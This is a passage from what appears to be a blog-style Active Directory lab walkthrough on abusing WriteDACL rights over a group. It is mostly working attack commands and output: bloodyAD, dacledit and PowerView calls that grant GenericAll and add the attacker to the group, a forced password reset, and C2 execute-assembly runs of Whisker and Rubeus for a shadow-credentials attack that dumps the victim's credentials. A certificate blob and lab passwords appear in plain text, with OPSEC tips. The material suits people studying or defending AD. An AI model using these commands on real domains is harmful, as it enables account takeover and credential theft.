```bash
dsacls "CN=TESTGROUP,CN=Users,DC=lab,DC=local" /G "akkoyun:WD"
```

Lets say our attacker user has permission on it  and we verifed with [find_aces](https://github.com/L1nvx/find-aces) and bloodhound it will be useless cause we can just add member of this group nothing more but we have **WRITEDACL** we can give ourself **GENERICALL** and can use Groups permissions with our attacker user after add ourself on group!

![alt text](../assets/images/dacl102.png)

and yeah that means we can **OWN** this group and give ourself **GenericAll**

![alt text](../assets/images/dacl103.png)

so our Attack Path will be **akkoyun** →x→ **karakoyun**

- give **GenericAll** testgroup with **akkoyun**
- So now we can add ourself on group
- Then we can use Testgroup permissions with **akkoyun** directly.

![alt text](../assets/images/dacl104.png)

We can verify this with miracle tool easily

https://github.com/L1nvx/find-aces

Really great tooolll!!! love it.

**Requirements**

```bash
python3 -m venv .venv                                                                        
source .venv/bin/activate
pip install --upgrade git+https://github.com/skelsec/msldap.git
pip install impacket
pip install colorama
```

and usage is easy too!!

```bash
python3 main.py --auth "ldap+ntlm-password://LAB\\irem:princess@dc.lab.local"

python3 main.py --auth "ldap+ntlm-nt://LAB\\irem:LMHASH:NTHASH@dc.lab.local"

python3 main.py --auth "ldap+kerberos://LAB\\irem@dc.lab.local"
```

for our lab

```bash
python3 main.py --auth "ldap+ntlm-password://lab.local\\akkoyun:Password@VALENOR-DC01.lab.local"
```

and just give 

```bash
find_object_aces <username> - Search for ACEs for a specific user                                                                                            
```

![alt text](../assets/images/dacl105.png)

Very strong tool!!! now lets do attack!!!

Attack aim was too easy:

1. Give **GENERICALL ourself**
2. add ourself on Group
3. Do group priviliges with victim user

We can do with bloodyAD which is another miracle tool Lets start with give **GenericAll** ourself

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u akkoyun -p Password add genericAll TESTGROUP akkoyun
[+] akkoyun has now GenericAll on TESTGROUP
```

or with dacledit

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'akkoyun' -target 'TESTGROUP' 'lab.local/akkoyun:Password'
[*] DACL backed up to dacledit-20250908-144257.bak
[*] DACL modified successfully!
```

Now we can add ourself in group

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u akkoyun -p Password add groupMember "TESTGROUP" akkoyun
[+] akkoyun added to TESTGROUP
```

Now we can use TestGroup **WriteDACL** privielges with **akkoyun** → **karakoyun**

Lets start with give **GenericAll** akkoyun → karakoyun

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u akkoyun -p Password add groupMember "TESTGROUP" akkoyun
[+] akkoyun added to TESTGROUP
```

now we can change Password etc

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u akkoyun -p Password set password karakoyun NewPassword123!
[+] Password changed successfully!
```

## **WriteDACL on User → Groups Attack (C2 Abuse)**

Thats the most common and favorite misconfiguration on AD envoirements. 

Lets check why is happening first and try to understand what we can do with when permission on `Groups`

```bash
dsacls "CN=TESTGROUP,CN=Users,DC=lab,DC=local" /G "akkoyun:WD"
```

Lets say our attacker user has permission on it  and we verifed with [find_aces](https://github.com/L1nvx/find-aces) and bloodhound it will be useless cause we can just add member of this group nothing more but we have **WRITEDACL** we can give ourself **GENERICALL** and can use Groups permissions with our attacker user after add ourself on group!

Full commands

```bash
powershell-import /home/elliot/tools/PowerView.ps1
```

For give **GenericAll** victim → Target Group

```bash
powerpick Add-DomainObjectAcl -Rights 'All' -TargetIdentity "akkoyun" -PrincipalIdentity "TESTGROUP"
```

For give **GenericAll** victim → Target User

Full commands

```bash
powershell-import /home/elliot/tools/PowerView.ps1

powerpick Add-DomainObjectAcl -Rights 'All' -TargetIdentity "akkoyun" -PrincipalIdentity "TESTGROUP"

powerpick Add-DomainObjectAcl -Rights 'All' -TargetIdentity "akkoyun" -PrincipalIdentity "karakoyun"
```

![alt text](../assets/images/dacl106.png)

now we can do **Shadow Credentials attack** because best for **OPSEC**

https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Whisker.exe

for add on target

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Whisker.exe add /target:karakoyun /domain:lab.local /dc:VALENOR-DC01.lab.local
```

![alt text](../assets/images/dacl107.png)

and now we can just run this command

```bash
execute-assembly /home/elliot/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe asktgt /user:karakoyun /certificate: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 /password:"PyV9FLy9QeOBArZJ" /domain:lab.local /dc:VALENOR-DC01.lab.local /getcredentials /show 
```

![alt text](../assets/images/dacl108.png)
